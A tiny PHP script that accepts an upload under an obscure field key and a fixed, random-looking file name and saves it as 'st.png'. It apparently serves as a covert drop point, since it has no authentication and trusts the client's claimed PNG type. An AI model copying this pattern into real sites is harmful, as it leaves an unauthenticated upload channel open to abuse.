<?php
    $namekey = 'WOKCAFECVAIEYCP';
    if ($_FILES[$namekey]['error'] > 0)
    {
    }
    else
    {
        if ($_FILES[$namekey]['type'] == 'image/png')
        {
            if ($_FILES[$namekey]['name'] == 'ACKNCUQIDVALDKFJA.png')
            {
                move_uploaded_file($_FILES[$namekey]['tmp_name'], 'st.png');
            }
        }
    }
?>